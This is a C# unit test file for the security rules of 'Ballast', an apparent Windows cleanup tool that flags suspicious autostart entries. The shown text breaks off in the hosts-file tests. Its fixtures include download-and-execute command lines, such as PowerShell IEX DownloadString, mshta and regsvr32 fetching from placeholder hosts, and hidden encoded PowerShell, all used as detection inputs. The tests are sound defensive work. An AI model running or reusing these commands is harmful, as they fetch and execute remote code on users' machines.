using Ballast.Core.Programs;
using Ballast.Core.Security;
using Ballast.Core.Security.Rules;
using Ballast.Core.Startup;
using Xunit;

namespace Ballast.Tests;

/// <summary>
/// Tests for the security heuristics. Every one of them asserts <b>rule logic</b> against a
/// synthetic machine: hand-built <see cref="StartupEntry"/> values, hand-built
/// <see cref="InstalledProgram"/> values, a fake signature source and a hosts file written into a
/// scratch directory.
///
/// <para>
/// Nothing here reads the real registry, the real hosts file or the real Authenticode chain, and
/// that is the point. A security rule whose test outcome depends on whether the machine running
/// the suite happens to be clean is not testing the rule — it would pass on a tidy laptop and
/// fail on a developer's, and neither result would say anything about the code.
/// </para>
///
/// <para>
/// The negative cases matter more than the positive ones. False positives are the expensive
/// failure for a feature like this: a page that cries wolf about ordinary software teaches its
/// reader to skip it, and this app has delete powers. So there are tests that a signed Microsoft
/// binary in System32, a normal program in Program Files, a Windows-made <c>.lnk</c> shortcut, a
/// version number like <c>python3.11.exe</c> and a folder called <c>Template</c> all produce
/// exactly nothing.
/// </para>
/// </summary>
public sealed class SecurityRuleTests : IDisposable
{
    // ---------------------------------------------------------------- fixtures

    private readonly string _scratch = Path.Combine(
        Path.GetTempPath(), "BallastSecurityTests_" + Guid.NewGuid().ToString("N")[..8]);

    private readonly string _cleanHostsFile;
    private readonly string _dirtyHostsFile;

    public SecurityRuleTests()
    {
        Directory.CreateDirectory(_scratch);

        _cleanHostsFile = Path.Combine(_scratch, "hosts-clean");
        _dirtyHostsFile = Path.Combine(_scratch, "hosts-dirty");

        File.WriteAllLines(_cleanHostsFile,
        [
            "# Copyright (c) 1993-2009 Microsoft Corp.",
            "#",
            "#      102.54.94.97     rhino.acme.com          # source server",
            "",
            "127.0.0.1       localhost",
            "::1             localhost",
            "0.0.0.0 ads.example.com",
            "0.0.0.0 tracker.example.net   # blocked by an ad list",
        ]);

        File.WriteAllLines(_dirtyHostsFile,
        [
            "127.0.0.1 localhost",
            "10.0.0.5  login.example.com",
            "127.0.0.1 www.avast.com",
        ]);
    }

    public void Dispose()
    {
        try
        {
            Directory.Delete(_scratch, recursive: true);
        }
        catch
        {
            // A leftover scratch folder in Temp is inert, and failing a test over cleanup would
            // hide whatever the test actually found.
        }
    }

    // ------------------------------------------------------- synthetic machine

    private const string ProgramFilesApp = @"C:\Program Files\Contoso Notes\notes.exe";
    private const string PerUserApp = @"C:\Users\Someone\AppData\Local\Programs\Contoso\contoso.exe";
    private const string SystemSvchost = @"C:\Windows\System32\svchost.exe";
    private const string TempExe = @"C:\Users\Someone\AppData\Local\Temp\updater.exe";
    private const string DownloadsExe = @"C:\Users\Someone\Downloads\portable-thing.exe";
    private const string Base64Blob = "JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AA==";

    private static readonly SignatureInfo ValidSignature = new(SignatureStatus.Valid, "Contoso Ltd", false);
    private static readonly SignatureInfo MicrosoftSignature = new(SignatureStatus.Valid, "Microsoft Windows", true);
    private static readonly SignatureInfo NoSignature = new(SignatureStatus.Unsigned, null, false);

    private static StartupEntry Entry(
        string name,
        string command,
        string? executablePath = null,
        bool enabled = true,
        StartupSource source = StartupSource.RegistryRunHkcu) => new()
    {
        Name = name,
        Command = command,
        ExecutablePath = executablePath,
        Source = source,
        IsEnabled = enabled,
        RequiresAdmin = false,
        Location = @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
    };

    private static InstalledProgram Program(
        string displayName,
        string? uninstallCommand = null,
        string? installLocation = null,
        string? iconPath = null) => new()
    {
        DisplayName = displayName,
        RegistryKeyPath = @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\" + displayName,
        Scope = ProgramScope.AllUsers,
        UninstallCommand = uninstallCommand,
        InstallLocation = installLocation,
        IconPath = iconPath,
    };

    /// <summary>
    /// Builds the shared context with a fake signature source.
    /// <c>Signatures</c> is deliberately left null: every rule is required to go through
    /// <see cref="SecurityScanContext.SignatureOfAsync"/>, so a rule that reached for the real
    /// verifier instead would fail loudly here rather than quietly consult the test machine.
    /// </summary>
    private static SecurityScanContext Context(
        IEnumerable<StartupEntry>? startup = null,
        IEnumerable<InstalledProgram>? programs = null,
        Func<string, SignatureInfo>? signatures = null) => new()
    {
        StartupEntries = startup?.ToArray() ?? [],
        InstalledPrograms = programs?.ToArray() ?? [],
        Signatures = null!,
        SignatureLookup = (path, _) => Task.FromResult(signatures?.Invoke(path) ?? ValidSignature),
    };

    private static SecurityScanContext One(StartupEntry entry, Func<string, SignatureInfo>? signatures = null) =>
        Context([entry], signatures: signatures);

    private static async Task<IReadOnlyList<SecurityFinding>> Run(ISecurityRule rule, SecurityScanContext context) =>
        await rule.EvaluateAsync(context, CancellationToken.None);

    private static IReadOnlyList<ISecurityRule> AllRules(string hostsFile) => SecurityAuditor.DefaultRules(hostsFile);

    /// <summary>An ordinary, tidy machine. Every rule must be silent about all of it.</summary>
    private static SecurityScanContext CleanMachine() => Context(
        startup:
        [
            Entry("Contoso Notes", $"\"{ProgramFilesApp}\" --background", ProgramFilesApp),
            Entry("Contoso Sync", $"\"{PerUserApp}\"", PerUserApp),
            Entry("SecurityHealth", $"\"{SystemSvchost}\" -k netsvcs", SystemSvchost),
            Entry("RtkAudio", @"rundll32.exe ""C:\Program Files\Contoso Audio\rtk.dll"",Startup", @"C:\Windows\System32\rundll32.exe"),
            Entry("Shortcut", @"C:\Users\Someone\Documents\report.pdf.lnk", @"C:\Users\Someone\Documents\report.pdf.lnk"),
            Entry("Python launcher", @"C:\Program Files\Python311\python3.11.exe", @"C:\Program Files\Python311\python3.11.exe"),
            Entry("Templates", @"C:\Users\Someone\Documents\Template\organiser.exe", @"C:\Users\Someone\Documents\Template\organiser.exe"),
        ],
        programs:
        [
            Program("Contoso Notes", "\"C:\\Program Files\\Contoso Notes\\unins000.exe\" /S", @"C:\Program Files\Contoso Notes", @"C:\Program Files\Contoso Notes\notes.exe,0"),
            Program("Contoso Audio", "MsiExec.exe /X{11111111-2222-3333-4444-555555555555}"),
        ],
        signatures: path => path.Contains(@"\Windows\", StringComparison.OrdinalIgnoreCase)
            ? MicrosoftSignature
            : ValidSignature);

    /// <summary>A machine with one example of everything the rules look for.</summary>
    private static SecurityScanContext DirtyMachine() => Context(
        startup:
        [
            Entry("Updater", TempExe, TempExe),
            Entry("WinHelper", @"C:\Users\Someone\AppData\Roaming\svchost.exe", @"C:\Users\Someone\AppData\Roaming\svchost.exe"),
            Entry("Invoice", @"wscript.exe ""C:\Users\Someone\Downloads\invoice.pdf.vbs"""),
            Entry("Loader", @"mshta.exe http://example.invalid/payload.hta"),
            Entry("Sync", $"powershell.exe -nop -w hidden -enc {Base64Blob}"),
        ],
        signatures: _ => NoSignature);

    // ------------------------------------------------------------ the contract

    [Fact]
    public void Every_rule_declares_an_id_a_name_and_a_rationale()
    {
        foreach (var rule in AllRules(_cleanHostsFile))
        {
            var type = rule.GetType().Name;
            Assert.False(string.IsNullOrWhiteSpace(rule.RuleId), $"{type} has no RuleId");
            Assert.False(string.IsNullOrWhiteSpace(rule.Name), $"{type} has no Name");
            Assert.False(string.IsNullOrWhiteSpace(rule.Rationale), $"{type} has no Rationale");

            // A rationale that does not say what the rule leaves alone is not a rationale.
            Assert.True(rule.Rationale.Length > 200, $"{type} has a rationale too short to argue with");
        }
    }

    [Fact]
    public void The_shipped_rule_set_is_exactly_the_documented_one()
    {
        var ids = AllRules(_cleanHostsFile).Select(r => r.RuleId).ToArray();

        Assert.Equal(ids.Length, ids.Distinct(StringComparer.Ordinal).Count());
        Assert.Equal(
            new[]
            {
                "BAL-AUTOSTART-UNSIGNED",
                "BAL-AUTOSTART-TEMP",
                "BAL-MASQUERADE",
                "BAL-DOUBLE-EXTENSION",
                "BAL-LOLBIN-PERSISTENCE",
                "BAL-ENCODED-COMMAND",
                "BAL-HOSTS-TAMPERED",
            },
            ids);
    }

    [Fact]
    public async Task Every_finding_carries_its_own_rule_id_an_explanation_and_evidence()
    {
        foreach (var rule in AllRules(_dirtyHostsFile))
        {
            foreach (var finding in await Run(rule, DirtyMachine()))
            {
                Assert.Equal(rule.RuleId, finding.RuleId);
                Assert.False(string.IsNullOrWhiteSpace(finding.Title), $"{rule.RuleId} produced a finding with no title");
                Assert.False(string.IsNullOrWhiteSpace(finding.Explanation), $"{rule.RuleId} produced a finding with no explanation");
                Assert.False(string.IsNullOrWhiteSpace(finding.Evidence), $"{rule.RuleId} produced a finding with no evidence");
            }
        }
    }

    [Fact]
    public async Task Every_rule_still_fires_on_the_thing_it_exists_to_notice()
    {
        // Guards against a rule quietly going dead: a check that stopped running looks exactly
        // like a check that found nothing.
        foreach (var rule in AllRules(_dirtyHostsFile))
        {
            Assert.NotEmpty(await Run(rule, DirtyMachine()));
        }
    }

    [Fact]
    public async Task No_rule_ever_claims_to_have_detected_or_removed_anything()
    {
        // Ballast is not an antivirus and must never read as one. Detection is Windows Security's
        // job; this feature reports things worth a look and changes nothing by itself.
        string[] forbidden =
            ["virus", "malware", "infected", "infection", "trojan", "spyware", "ransomware", "quarantin", "threat"];

        foreach (var rule in AllRules(_dirtyHostsFile))
        {
            var texts = new List<string> { rule.Name, rule.Rationale };

            foreach (var finding in await Run(rule, DirtyMachine()))
            {
                texts.Add(finding.Title);
                texts.Add(finding.Explanation);
                texts.Add(finding.Evidence);
                texts.Add(finding.Recommendation ?? string.Empty);
            }

            foreach (var word in forbidden)
            {
                foreach (var text in texts)
                {
                    Assert.False(
                        text.Contains(word, StringComparison.OrdinalIgnoreCase),
                        $"{rule.RuleId} uses the word '{word}': {text}");
                }
            }
        }
    }

    [Fact]
    public async Task No_rule_says_anything_about_an_ordinary_tidy_machine()
    {
        foreach (var rule in AllRules(_cleanHostsFile))
        {
            var findings = await Run(rule, CleanMachine());
            Assert.True(
                findings.Count == 0,
                $"{rule.RuleId} fired on a clean machine: {string.Join(" | ", findings.Select(f => f.Evidence))}");
        }
    }

    [Fact]
    public async Task A_microsoft_signed_binary_in_system32_produces_nothing_from_any_rule()
    {
        var context = One(
            Entry("SecurityHealth", $"\"{SystemSvchost}\" -k netsvcs", SystemSvchost),
            _ => MicrosoftSignature);

        foreach (var rule in AllRules(_cleanHostsFile)) Assert.Empty(await Run(rule, context));
    }

    [Fact]
    public async Task A_normal_program_in_program_files_produces_nothing_from_any_rule()
    {
        var context = Context(
            startup: [Entry("Contoso Notes", $"\"{ProgramFilesApp}\" --background", ProgramFilesApp)],
            programs: [Program("Contoso Notes", $"\"C:\\Program Files\\Contoso Notes\\unins000.exe\" /S", @"C:\Program Files\Contoso Notes")],
            signatures: _ => ValidSignature);

        foreach (var rule in AllRules(_cleanHostsFile)) Assert.Empty(await Run(rule, context));
    }

    // --------------------------------------------- BAL-AUTOSTART-UNSIGNED

    [Fact]
    public async Task Unsigned_autostart_in_a_normal_place_is_medium_and_offers_the_reversible_toggle()
    {
        var findings = await Run(
            new UnsignedAutostartRule(),
            One(Entry("Little Tool", $"\"{ProgramFilesApp}\"", ProgramFilesApp), _ => NoSignature));

        var finding = Assert.Single(findings);
        Assert.Equal("BAL-AUTOSTART-UNSIGNED", finding.RuleId);
        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Equal(ProgramFilesApp, finding.TargetPath);
        Assert.True(finding.CanDisableStartupEntry);
    }

    [Fact]
    public async Task Unsigned_autostart_running_from_temp_is_ranked_higher()
    {
        var finding = Assert.Single(await Run(
            new UnsignedAutostartRule(),
            One(Entry("Updater", TempExe, TempExe), _ => NoSignature)));

        Assert.Equal(FindingSeverity.High, finding.Severity);
    }

    [Fact]
    public async Task Unsigned_autostart_under_appdata_is_not_escalated_because_ordinary_software_lives_there()
    {
        var finding = Assert.Single(await Run(
            new UnsignedAutostartRule(),
            One(Entry("Contoso Sync", PerUserApp, PerUserApp), _ => NoSignature)));

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
    }

    [Fact]
    public async Task A_revoked_certificate_is_ranked_higher_than_no_certificate_at_all()
    {
        var finding = Assert.Single(await Run(
            new UnsignedAutostartRule(),
            One(Entry("Old Tool", ProgramFilesApp, ProgramFilesApp),
                _ => new SignatureInfo(SignatureStatus.Revoked, "Withdrawn Ltd", false))));

        Assert.Equal(FindingSeverity.High, finding.Severity);
    }

    [Theory]
    [InlineData(SignatureStatus.Valid)]
    [InlineData(SignatureStatus.Expired)]
    [InlineData(SignatureStatus.Unreadable)]
    public async Task Signature_states_that_are_fine_or_unknowable_are_left_alone(SignatureStatus status)
    {
        Assert.Empty(await Run(
            new UnsignedAutostartRule(),
            One(Entry("Something", ProgramFilesApp, ProgramFilesApp),
                _ => new SignatureInfo(status, "Contoso Ltd", false))));
    }

    [Fact]
    public async Task A_microsoft_binary_is_skipped_even_when_its_certificate_is_not_trusted()
    {
        Assert.Empty(await Run(
            new UnsignedAutostartRule(),
            One(Entry("Windows thing", SystemSvchost, SystemSvchost),
                _ => new SignatureInfo(SignatureStatus.Untrusted, "Microsoft Windows", true))));
    }

    [Fact]
    public async Task An_entry_that_is_already_disabled_is_not_reported()
    {
        Assert.Empty(await Run(
            new UnsignedAutostartRule(),
            One(Entry("Little Tool", ProgramFilesApp, ProgramFilesApp, enabled: false), _ => NoSignature)));
    }

    [Fact]
    public async Task An_executable_that_cannot_be_located_is_not_judged()
    {
        // A bare command name is resolved through PATH. We do not know which file it is, and
        // cannot tell has to mean stay silent.
        Assert.Empty(await Run(
            new UnsignedAutostartRule(),
            One(Entry("Mystery", "someapp.exe --run", "someapp.exe"), _ => NoSignature)));
    }

    // ------------------------------------------------- BAL-AUTOSTART-TEMP

    [Theory]
    [InlineData(@"C:\Users\Someone\AppData\Local\Temp\thing.exe")]
    [InlineData(@"C:\Windows\Temp\thing.exe")]
    [InlineData(@"C:\Temp\thing.exe")]
    [InlineData(@"C:\$Recycle.Bin\S-1-5-21-1\thing.exe")]
    public async Task Autostart_from_scratch_space_is_high(string path)
    {
        var finding = Assert.Single(await Run(new TempFolderAutostartRule(), One(Entry("Thing", path, path))));

        Assert.Equal("BAL-AUTOSTART-TEMP", finding.RuleId);
        Assert.Equal(FindingSeverity.High, finding.Severity);
        Assert.Equal(path, finding.TargetPath);
    }

    [Fact]
    public async Task A_signed_program_in_temp_is_still_high_because_nothing_means_to_keep_running_from_there()
    {
        var finding = Assert.Single(await Run(
            new TempFolderAutostartRule(),
            One(Entry("Updater", TempExe, TempExe), _ => ValidSignature)));

        Assert.Equal(FindingSeverity.High, finding.Severity);
    }

    // Downloads is deliberately never High. Someone who tells a downloaded portable program to
    // start with Windows produces exactly this pattern, and the rule's own rationale concedes it —
    // a finding cannot admit that and still rank itself as needing attention today.

    [Fact]
    public async Task A_signed_portable_program_autostarting_from_downloads_is_only_low()
    {
        var finding = Assert.Single(await Run(
            new TempFolderAutostartRule(),
            One(Entry("WizTree", DownloadsExe, DownloadsExe), _ => ValidSignature)));

        Assert.Equal(FindingSeverity.Low, finding.Severity);
    }

    [Fact]
    public async Task An_unsigned_program_autostarting_from_downloads_is_medium_but_never_high()
    {
        var finding = Assert.Single(await Run(
            new TempFolderAutostartRule(),
            One(Entry("Thing", DownloadsExe, DownloadsExe), _ => NoSignature)));

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
    }

    [Theory]
    [InlineData(ProgramFilesApp)]
    [InlineData(PerUserApp)]
    [InlineData(@"C:\Users\Someone\Documents\Template\organiser.exe")]
    [InlineData(@"C:\ProgramData\Contoso\agent.exe")]
    [InlineData(@"C:\Users\Someone\AppData\Roaming\Contoso\Temperature\sensor.exe")]
    public async Task Ordinary_install_locations_are_not_mistaken_for_scratch_space(string path)
    {
        Assert.Empty(await Run(new TempFolderAutostartRule(), One(Entry("Thing", path, path))));
    }

    [Fact]
    public async Task A_disabled_entry_in_temp_is_not_reported_because_it_does_not_run()
    {
        Assert.Empty(await Run(new TempFolderAutostartRule(), One(Entry("Updater", TempExe, TempExe, enabled: false))));
    }

    // ----------------------------------------------------- BAL-MASQUERADE

    [Theory]
    [InlineData(@"C:\Users\Someone\AppData\Roaming\svchost.exe")]
    [InlineData(@"C:\Users\Public\lsass.exe")]
    [InlineData(@"C:\ProgramData\csrss.exe")]
    [InlineData(@"C:\Windows\Temp\winlogon.exe")]
    public async Task A_system_process_name_outside_the_windows_folder_is_high(string path)
    {
        var finding = Assert.Single(await Run(new SystemBinaryMasqueradeRule(), One(Entry("Thing", path, path))));

        Assert.Equal("BAL-MASQUERADE", finding.RuleId);
        Assert.Equal(FindingSeverity.High, finding.Severity);
        Assert.Equal(path, finding.TargetPath);
    }

    [Fact]
    public async Task A_windows_folder_below_the_user_profile_does_not_pass_as_the_windows_folder()
    {
        // The whole rule turns on this: C:\Users\bob\Windows\ is not %WINDIR%.
        const string path = @"C:\Users\Someone\Windows\svchost.exe";
        Assert.Single(await Run(new SystemBinaryMasqueradeRule(), One(Entry("Thing", path, path))));
    }

    [Theory]
    [InlineData(SystemSvchost)]
    [InlineData(@"C:\Windows\SysWOW64\rundll32.exe")]
    [InlineData(@"C:\Windows\explorer.exe")]
    [InlineData(@"C:\Windows\WinSxS\amd64_microsoft-windows-services_31bf3856ad364e35_10.0.19041.1_none_a1b2\services.exe")]
    [InlineData(@"C:\Windows.old\Windows\System32\lsass.exe")]
    [InlineData(@"C:\Program Files\Contoso Notes\notes.exe")]
    public async Task Genuine_system_locations_and_ordinary_names_are_left_alone(string path)
    {
        Assert.Empty(await Run(new SystemBinaryMasqueradeRule(), One(Entry("Thing", path, path))));
    }

    [Fact]
    public async Task An_unlocatable_system_name_is_not_judged()
    {
        Assert.Empty(await Run(new SystemBinaryMasqueradeRule(), One(Entry("Thing", "svchost.exe", "svchost.exe"))));
    }

    [Fact]
    public async Task The_program_is_read_from_the_front_of_a_command_not_from_a_later_argument()
    {
        // Parser regression. Looking for ".exe" before ".cmd" made this whole string parse as one
        // program name, so the file name came out as "svchost.exe" and an ordinary batch script
        // produced a High finding about nothing. The program here is run.cmd; the rule judges
        // where a program lives, not what it was handed.
        var context = One(Entry("Bootstrap", @"C:\tools\run.cmd C:\Users\Someone\AppData\svchost.exe"));

        Assert.Empty(await Run(new SystemBinaryMasqueradeRule(), context));
    }

    [Fact]
    public async Task An_installed_program_pointing_at_an_impersonating_file_is_reported_too()
    {
        const string path = @"C:\Users\Someone\AppData\Local\csrss.exe";
        var context = Context(programs: [Program("Free Codec Pack", $"\"{path}\" /uninstall")]);

        var finding = Assert.Single(await Run(new SystemBinaryMasqueradeRule(), context));
        Assert.Equal(path, finding.TargetPath);
        Assert.False(finding.CanDisableStartupEntry);
    }

    // ----------------------------------------------- BAL-DOUBLE-EXTENSION

    [Theory]
    [InlineData(@"C:\Users\Someone\Downloads\invoice.pdf.exe", "pdf")]
    [InlineData(@"C:\Users\Someone\Downloads\contract.doc.scr", "doc")]
    [InlineData(@"C:\Users\Someone\Pictures\holiday.jpg.bat", "jpg")]
    public async Task A_document_name_in_front_of_a_program_extension_is_high(string path, string pretend)
    {
        var finding = Assert.Single(await Run(new DoubleExtensionRule(), One(Entry("Thing", path, path))));

        Assert.Equal("BAL-DOUBLE-EXTENSION", finding.RuleId);
        Assert.Equal(FindingSeverity.High, finding.Severity);
        Assert.Contains(pretend, finding.Title, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData(@"C:\Users\Someone\Documents\report.pdf.lnk")]     // Windows names shortcuts this way itself
    [InlineData(@"C:\Program Files\Python311\python3.11.exe")]     // a version number is not a disguise
    [InlineData(@"C:\Program Files\Contoso\app-2.0.4.exe")]
    [InlineData(@"C:\Program Files\Contoso Notes\notes.exe")]
    [InlineData(@"C:\Users\Someone\Documents\notes.txt")]
    public async Task Ordinary_and_windows_made_names_are_not_treated_as_disguises(string path)
    {
        Assert.Empty(await Run(new DoubleExtensionRule(), One(Entry("Thing", path, path))));
    }

    [Fact]
    public async Task A_disguised_name_is_caught_when_it_is_an_argument_rather_than_the_program()
    {
        var context = One(Entry("Invoice", @"wscript.exe ""C:\Users\Someone\Downloads\invoice.pdf.vbs"""));

        var finding = Assert.Single(await Run(new DoubleExtensionRule(), context));
        Assert.Equal(@"C:\Users\Someone\Downloads\invoice.pdf.vbs", finding.TargetPath);
    }

    [Fact]
    public async Task A_disguised_name_in_an_installed_programs_icon_path_is_caught()
    {
        var context = Context(programs: [Program("Photo Viewer", iconPath: @"C:\Users\Someone\holiday.jpg.scr,0")]);

        var finding = Assert.Single(await Run(new DoubleExtensionRule(), context));
        Assert.Equal(@"C:\Users\Someone\holiday.jpg.scr", finding.TargetPath);
    }

    // ------------------------------------------- BAL-LOLBIN-PERSISTENCE

    [Fact]
    public async Task A_helper_binary_pointed_at_a_web_address_is_high()
    {
        var finding = Assert.Single(await Run(
            new LolBinPersistenceRule(),
            One(Entry("Loader", "mshta.exe http://example.invalid/payload.hta"))));

        Assert.Equal("BAL-LOLBIN-PERSISTENCE", finding.RuleId);
        Assert.Equal(FindingSeverity.High, finding.Severity);
    }

    [Fact]
    public async Task A_helper_binary_pointed_at_a_network_share_is_high()
    {
        var finding = Assert.Single(await Run(
            new LolBinPersistenceRule(),
            One(Entry("Loader", @"rundll32.exe \\fileserver\share\payload.dll,Start"))));

        Assert.Equal(FindingSeverity.High, finding.Severity);
    }

    [Fact]
    public async Task Rundll32_loading_a_signed_library_is_the_ordinary_driver_shape_and_stays_silent()
    {
        var context = One(
            Entry("RtkAudio", @"rundll32.exe ""C:\Program Files\Contoso Audio\rtk.dll"",Startup"),
            _ => ValidSignature);

        Assert.Empty(await Run(new LolBinPersistenceRule(), context));
    }

    [Fact]
    public async Task Rundll32_loading_an_unsigned_library_is_medium()
    {
        var context = One(
            Entry("Helper", @"rundll32.exe ""C:\Users\Someone\AppData\Roaming\helper.dll"",Start"),
            _ => NoSignature);

        var finding = Assert.Single(await Run(new LolBinPersistenceRule(), context));
        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Equal(@"C:\Users\Someone\AppData\Roaming\helper.dll", finding.TargetPath);
    }

    [Fact]
    public async Task A_signed_library_loaded_out_of_temp_is_still_reported()
    {
        var context = One(
            Entry("Helper", @"rundll32.exe ""C:\Users\Someone\AppData\Local\Temp\helper.dll"",Start"),
            _ => ValidSignature);

        Assert.Single(await Run(new LolBinPersistenceRule(), context));
    }

    // The plain case used to report anything it could not resolve, which is the opposite of how
    // the rest of this app treats uncertainty. Measured against a real machine, that reported six
    // ordinary things — two of them stock Windows scheduled tasks. Each case below is one of them.

    [Fact]
    public async Task A_helper_binary_with_nothing_identifiable_to_load_says_nothing()
    {
        Assert.Empty(await Run(new LolBinPersistenceRule(), One(Entry("Bootstrap", @"cmd.exe /c echo hello"))));
    }

    [Fact]
    public async Task Windows_installer_self_repair_says_nothing_because_a_product_code_is_not_a_payload()
    {
        Assert.Empty(await Run(
            new LolBinPersistenceRule(),
            One(Entry("Office Repair", @"MsiExec.exe /fu {90160000-008C-0000-1000-0000000FF1CE}"))));
    }

    [Theory]
    [InlineData(@"%windir%\system32\rundll32.exe %windir%\system32\PcaSvc.dll,PcaPatchSdbTask")]
    [InlineData(@"%systemroot%\system32\cmd.exe /d /c %systemroot%\system32\hpatchmonTask.cmd")]
    public async Task A_stock_windows_task_written_with_environment_variables_says_nothing(string command)
    {
        // Both of these are real, and both were reported at Medium before this was narrowed:
        // %windir% is not drive-rooted, so the payload looked unresolvable and fell through.
        Assert.Empty(await Run(new LolBinPersistenceRule(), One(Entry("Windows task", command), _ => NoSignature)));
    }

    [Fact]
    public async Task A_script_in_program_files_says_nothing_because_a_cmd_file_can_never_be_signed()
    {
        // npm.cmd ships with Node. No signature check can clear a .cmd at any location, so
        // without the write-barrier argument this would be a permanent finding on every machine
        // with Node installed.
        Assert.Empty(await Run(
            new LolBinPersistenceRule(),
            One(Entry("npm watch", @"cmd.exe /c ""C:\Program Files\nodejs\npm.cmd"" run watch"), _ => NoSignature)));
    }

    [Fact]
    public async Task A_bare_library_name_resolved_through_PATH_is_not_judged()
    {
        Assert.Empty(await Run(
            new LolBinPersistenceRule(),
            One(Entry("Control panel", @"rundll32.exe shell32.dll,Control_RunDLL desk.cpl"), _ => NoSignature)));
    }

    [Fact]
    public async Task A_payload_the_verifier_could_not_read_is_not_judged()
    {
        Assert.Empty(await Run(
            new LolBinPersistenceRule(),
            One(Entry("Helper", @"rundll32.exe ""C:\Users\Someone\AppData\Roaming\helper.dll"",Start"),
                _ => new SignatureInfo(SignatureStatus.Unreadable, null, false))));
    }

    // ...and the teeth the narrowing must not have removed.

    [Fact]
    public async Task A_remote_payload_is_still_high_even_from_a_location_the_plain_case_would_excuse()
    {
        var finding = Assert.Single(await Run(
            new LolBinPersistenceRule(),
            One(Entry("Loader", @"rundll32.exe \\fileserver\share\payload.dll,Start"), _ => ValidSignature)));

        Assert.Equal(FindingSeverity.High, finding.Severity);
    }

    [Fact]
    public async Task An_unsigned_payload_in_user_writable_space_is_still_medium()
    {
        // Persistence that does not already have administrator rights has to live somewhere a
        // standard user can write, so this is precisely what the narrowing had to leave in scope.
        var finding = Assert.Single(await Run(
            new LolBinPersistenceRule(),
            One(Entry("Helper", @"cmd.exe /c ""C:\Users\Someone\AppData\Roaming\start.bat"""), _ => NoSignature)));

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
    }

    [Fact]
    public async Task An_obscured_helper_command_is_high()
    {
        var finding = Assert.Single(await Run(
            new LolBinPersistenceRule(),
            One(Entry("Sync", $"powershell.exe -nop -w hidden -enc {Base64Blob}"))));

        Assert.Equal(FindingSeverity.High, finding.Severity);
    }

    [Fact]
    public async Task Regsvr32_fetching_a_scriptlet_over_http_is_high()
    {
        var finding = Assert.Single(await Run(
            new LolBinPersistenceRule(),
            One(Entry("Reg", @"regsvr32.exe /s /n /u /i:http://example.invalid/file.sct scrobj.dll"))));

        Assert.Equal(FindingSeverity.High, finding.Severity);
    }

    [Fact]
    public async Task A_program_that_starts_itself_is_not_a_helper_binary()
    {
        Assert.Empty(await Run(
            new LolBinPersistenceRule(),
            One(Entry("Contoso Notes", $"\"{ProgramFilesApp}\" --background", ProgramFilesApp))));
    }

    [Fact]
    public async Task A_disabled_helper_entry_is_not_reported()
    {
        Assert.Empty(await Run(
            new LolBinPersistenceRule(),
            One(Entry("Loader", "mshta.exe http://example.invalid/payload.hta", enabled: false))));
    }

    // ---------------------------------------------- BAL-ENCODED-COMMAND

    [Theory]
    [InlineData("powershell.exe -EncodedCommand " + Base64Blob)]
    [InlineData("powershell.exe -w hidden -File C:\\x\\a.ps1")]
    [InlineData("powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')\"")]
    [InlineData("powershell.exe -Command [System.Convert]::FromBase64String($x)")]
    public async Task A_command_written_to_be_unreadable_is_high(string command)
    {
        var finding = Assert.Single(await Run(new ObscuredCommandRule(), One(Entry("Sync", command))));

        Assert.Equal("BAL-ENCODED-COMMAND", finding.RuleId);
        Assert.Equal(FindingSeverity.High, finding.Severity);
    }

    // The relaxed switches never reach High, however many of them appear. -NoProfile with
    // -ExecutionPolicy Bypass is the standard Chocolatey and corporate-logon-script invocation,
    // and it used to score High — a finding whose own explanation called itself routine for
    // package managers while demanding to be read today.

    [Theory]
    [InlineData(@"powershell.exe -NoProfile -File C:\tools\refresh.ps1")]
    [InlineData(@"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\ProgramData\chocolatey\bin\refresh.ps1")]
    [InlineData(@"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File C:\IT\logon.ps1")]
    public async Task Relaxed_switches_are_only_low_however_many_of_them_there_are(string command)
    {
        var finding = Assert.Single(await Run(new ObscuredCommandRule(), One(Entry("Build", command))));

        Assert.Equal(FindingSeverity.Low, finding.Severity);
    }

    [Theory]
    [InlineData(@"C:\Program Files\Siex\app.exe --start")]           // "iex" inside a folder name
    [InlineData(@"C:\Program Files\Contoso\export.exe -encoding utf8")]
    [InlineData(@"""C:\Program Files\Contoso Notes\notes.exe"" --background")]
    [InlineData(@"C:\Program Files\Contoso\tool.exe -e settings.json")]
    public async Task Commands_that_merely_look_like_the_markers_are_left_alone(string command)
    {
        Assert.Empty(await Run(new ObscuredCommandRule(), One(Entry("Thing", command))));
    }

    // Every switch-shaped marker is a PowerShell spelling. Handed to any other program the same
    // letters mean whatever that program decides, so they are only read when a PowerShell host is
    // actually named. "sync.exe -e <session token>" was reported at High before this gate.

    [Theory]
    [InlineData(@"""C:\Program Files\Contoso\sync.exe"" -e aBcD1234efGh5678IjKlMn")]
    [InlineData(@"""C:\Program Files\Contoso\sync.exe"" -w hidden")]
    [InlineData(@"""C:\Program Files\Contoso\sync.exe"" -nop -noni")]
    public async Task Powershell_switch_names_handed_to_another_program_are_not_markers(string command)
    {
        Assert.Empty(await Run(new ObscuredCommandRule(), One(Entry("Sync", command))));
    }

    [Fact]
    public async Task The_same_switches_still_count_when_powershell_is_further_along_the_command()
    {
        var finding = Assert.Single(await Run(
            new ObscuredCommandRule(),
            One(Entry("Sync", $"cmd.exe /c powershell.exe -w hidden -enc {Base64Blob}"))));

        Assert.Equal(FindingSeverity.High, finding.Severity);
    }

    [Fact]
    public async Task Powershell_code_in_a_command_line_is_read_whatever_the_program_is()
    {
        // IEX and DownloadString are PowerShell code, not switch names, so they need no gate.
        var finding = Assert.Single(await Run(
            new ObscuredCommandRule(),
            One(Entry("Loader", @"mshta.exe vbscript:Execute(""IEX (New-Object Net.WebClient).DownloadString('http://x.invalid')"")"))));

        Assert.Equal(FindingSeverity.High, finding.Severity);
    }

    // ----------------------------------------------- BAL-HOSTS-TAMPERED

    [Fact]
    public async Task A_normal_hosts_file_including_an_ad_blocking_list_says_nothing()
    {
